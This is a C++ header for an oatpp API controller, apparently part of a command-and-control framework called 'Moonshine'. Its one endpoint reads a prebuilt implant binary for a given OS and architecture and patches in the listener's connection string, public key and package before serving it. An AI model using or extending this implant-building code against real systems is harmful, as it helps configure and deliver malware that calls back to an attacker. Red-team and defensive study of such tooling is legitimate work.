#ifndef MOONSHINE_SERVER_CONTROLLER_ARTIFACT_H_
#define MOONSHINE_SERVER_CONTROLLER_ARTIFACT_H_

#include "oatpp/web/server/api/ApiController.hpp"
#include "oatpp/parser/json/mapping/ObjectMapper.hpp"
#include "oatpp/core/macro/codegen.hpp"
#include "oatpp/core/macro/component.hpp"
#include "oatpp-swagger/Types.hpp"

#include <spdlog/spdlog.h>
#include <util/string.hpp>
#include <util/filesystem.hpp>

#include "dto/artifact.h"
#include "services/config.h"

namespace controllers {

#include OATPP_CODEGEN_BEGIN(ApiController) //<- Begin Codegen

struct artifact : public oatpp::web::server::api::ApiController {

  explicit artifact(const std::shared_ptr<ObjectMapper> &objectMapper)
      : oatpp::web::server::api::ApiController(objectMapper) {}

  static std::shared_ptr<artifact> createShared(OATPP_COMPONENT(std::shared_ptr<ObjectMapper>, objectMapper)) {
    return std::make_shared<artifact>(objectMapper);
  }

  ENDPOINT_INFO(downloadImplant) {
    info->summary = "Download implant artifact";
    info->addResponse<oatpp::swagger::Binary>(Status::CODE_200, "application/octet-stream");
    info->addResponse<Object<dto::status>>(Status::CODE_400, "application/json");
    info->addResponse<Object<dto::status>>(Status::CODE_404, "application/json");
    info->addResponse<Object<dto::status>>(Status::CODE_500, "application/json");
    info->pathParams["id"].description = "Listener Identifier";
    info->pathParams["operating_system"].description = "Operating System";
    info->pathParams["architecture"].description = "Architecture";
    info->pathParams["type"].description = "Artifact Type";
  }
  ENDPOINT("GET", "listeners/{id}/artifacts/{operating_system}/{architecture}/{type}", downloadImplant, PATH(String, id), PATH(oatpp::Enum<dto::operating_system>, operating_system), PATH(oatpp::Enum<dto::architecture>, architecture), PATH(oatpp::Enum<dto::artifact_type>, type)) {
    auto listener_dto = _listenerService->getByIdWithChildren(const_cast<String &>(id));

    std::string filename = "implant.";
    filename.append(oatpp::Enum<dto::operating_system>::getEntryByValue(operating_system).name.std_str() + ".");
    filename.append(oatpp::Enum<dto::architecture>::getEntryByValue(architecture).name.std_str());
    if (operating_system == dto::operating_system::WINDOWS) {
      filename.append("." + oatpp::Enum<dto::artifact_type>::getEntryByValue(type).name.std_str());
    }
    else if (type == dto::artifact_type::DLL) {
      filename.append(".so");
    }
    filename = util::string::to_lower(filename);

    std::string artifact_template;
    try {
      spdlog::debug("Retrieving artifact from '{}'", _configService.get("implants_dir") + "/" + filename);
      artifact_template = util::string::convert(util::filesystem::read_file(_configService.get("implants_dir") + "/" + filename));
    }
    catch (std::exception &e) {
      spdlog::warn("Artifact not found at '{}'", _configService.get("implants_dir") + "/" + filename);
      OATPP_ASSERT_HTTP(false, Status::CODE_404, "Artifact not found");
    }

    std::vector<std::pair<std::string, std::string>> pairs;
    pairs.emplace_back(std::string(45, 'A'), listener_dto->implant_connection_string);
    pairs.emplace_back(std::string(45, 'B'), _configService.get("public_key"));
    pairs.emplace_back(std::string(45, 'C'), listener_dto->implant_package);

    spdlog::debug("Patching artifact {}", filename);
    for (auto & pair : pairs) {
      auto needle = pair.first;
      auto substitute = pair.second;

      // Ideally we would use std::boyer_moore_searcher here, but it's not available on macOS :-/
      auto wordPosition = search(artifact_template.begin(), artifact_template.end(),std::default_searcher(needle.begin(), needle.end()));
      if (wordPosition != artifact_template.end()) {
        auto start = std::distance(begin(artifact_template), wordPosition);
        auto end = artifact_template.find_first_not_of(needle[0], start);
        //auto length = std::distance(begin(input), wordPosition.second) - start;
        auto length = end - start;
        spdlog::debug("Found '{}...' at offset {}, length {} in artifact {}", needle.substr(0, 4), start, length, filename);

        if (substitute.size() > length) {
          OATPP_ASSERT_HTTP(false, Status::CODE_500, "Error patching artifact, data too large");
        }

        substitute.insert(substitute.end(), length - substitute.size(), '\0');
        artifact_template.replace(start, length, substitute);
      } else {
        spdlog::error("Could not find '{}...' in artifact {}, aborting", needle.substr(0, 4), filename);
        OATPP_ASSERT_HTTP(false, Status::CODE_500, "Error patching artifact, could not find offset");
      }
    }

    oatpp::String buffer(artifact_template.data(), artifact_template.size());
    auto response = createResponse(Status::CODE_200, buffer);
    response->putHeader(Header::CONTENT_TYPE, "application/octet-stream");
    response->putHeader(Header::TRANSFER_ENCODING, "application/octet-stream");
    return response;
  }

 private:
  services::listener *_listenerService = services::listener::instance(); // Create listener service.
  services::config _configService; // Create config service.
};

#include OATPP_CODEGEN_END(ApiController) //<- End Codegen

}

#endif //MOONSHINE_SERVER_CONTROLLER_ARTIFACT_H_
